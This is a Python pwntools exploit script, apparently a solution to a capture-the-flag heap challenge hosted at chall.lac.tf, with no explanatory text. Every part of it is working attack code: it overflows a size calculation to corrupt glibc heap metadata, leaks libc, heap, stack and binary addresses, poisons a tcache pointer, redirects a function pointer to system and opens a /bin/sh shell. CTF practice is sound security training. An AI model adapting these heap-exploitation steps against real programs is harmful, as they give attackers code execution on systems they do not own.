#!/usr/bin/env python3

from pwn import *

serv = "chall.lac.tf"
port = 31234

exe = ELF("./chall")
libc = ELF("./libc.so.6")

context.binary = exe

def conn():
    if args.REMOTE:
        r = remote(serv, port)
    else:
        r = process(["stdbuf", "-i0", "-o0", exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript="""
                base
                libc
            """)
    return r

r = conn()

def add():
    r.sendlineafter(b"> ", b"0")

def resize(idx, sz):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b": ", str(idx).encode())
    r.sendlineafter(b": ", str(sz).encode())

def ins(idx, val):
    if val & 0x80000000:
        val -= 2**32
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b": ", str(idx).encode())
    r.sendlineafter(b": ", str(val).encode())

def ins64(idx, val):
    ins(idx, val&0xffffffff)
    ins(idx, val>>32)

def ins64n(idx, val, n):
    for _ in range(n):
        ins(idx, val&0xffffffff)
        ins(idx, val>>32)

def mangle(ptr, pos):
    return ptr ^ (pos >> 12)

def main():
    #if args.REMOTE and serv == "localhost":
    #    r.sendlineafter(b"(gdb)", "set disable-randomization off")
    #    r.sendlineafter(b"(gdb)", "file chall")
    #    r.sendlineafter(b"(gdb)", "r")
    add()
    add()
    add()
    add()
    add()
    add()
    add()
    add()
    add()
    add()
    add()
    resize(0, (2**64)//4 + 0x20//4)
    resize(1, 0x40//4)
    resize(2, 0x800//4)
    ins64n(0, 0xcafebabedeadbeef, 5)
    ins64(0, 0x421)
    ins64n(2, 0, 0x3c8//8)
    ins64(2, 0x21)
    ins64n(2, 0, 3)
    ins64(2, 0x21)
    resize(1, 0x60//4)
    resize(3, 0x70//4)
    r.recvuntil(b"rain = 0 0 0 0 0 0 0 0 0 0 929 0 ")
    libc.address = int(r.recvuntil(b" "))&0xffffffff
    libc.address |= (int(r.recvuntil(b" "))&0xffffffff)<<32
    libc.address -= 0x203b20
    log.info(f"{hex(libc.address)=}")
    resize(4, 0x390//4)
    resize(4, 0x400//4)
    r.recvuntil(b"rain = 0 0 0 0 0 0 0 0 0 0 929 0 ")
    heap = int(r.recvuntil(b" "))&0xffffffff
    heap |= (int(r.recvuntil(b" "))&0xffffffff)<<32
    heap <<= 12
    log.info(f"{hex(heap)=}")
    resize(5, (2**64)//4 + 0x80//4)
    resize(6, 0x390//4)
    resize(7, 0x390//4)
    resize(6, 0x400//4)
    resize(7, 0x400//4)
    ins64n(5, 0xdeadbeef, 0x80//8 + 2)
    if args.REMOTE:
        target = heap+0x470
    else:
        target = heap+0x450
    log.info(f"{hex(target)=}")
    ins64(5, mangle(target, heap+0x1730))
    resize(8, 0x390//4)
    resize(9, 0x390//4)
    ins64(9, libc.sym.environ)
    ins64(9, 8)
    ins64(9, 8)
    r.recvuntil(b"cloud 0: precipitation = 8, saturation = 8, rain = ")
    stack = int(r.recvuntil(b" "))&0xffffffff
    stack |= (int(r.recvuntil(b" "))&0xffffffff)<<32
    log.info(f"{hex(stack)=}")
    ins64(9, stack-0x38)
    ins64(9, 4)
    ins64(9, 4)
    r.recvuntil(b"cloud 1: precipitation = 4, saturation = 4, rain = 0 0 ")
    exe.address = int(r.recvuntil(b" "))&0xffffffff
    exe.address |= (int(r.recvuntil(b" "))&0xffffffff)<<32
    exe.address -= 0x1741
    log.info(f"{hex(exe.address)=}")
    ins64(9, exe.address+0x4050)
    ins64(9, 2)
    ins64(9, 0x100)
    ins64(2, libc.sym.system-0x10)
    resize(10, 0x500)
    ins64(10, u64(b"/bin/sh\x00"))
    resize(10, 0x800)
    r.interactive()

if __name__ == "__main__":
    main()
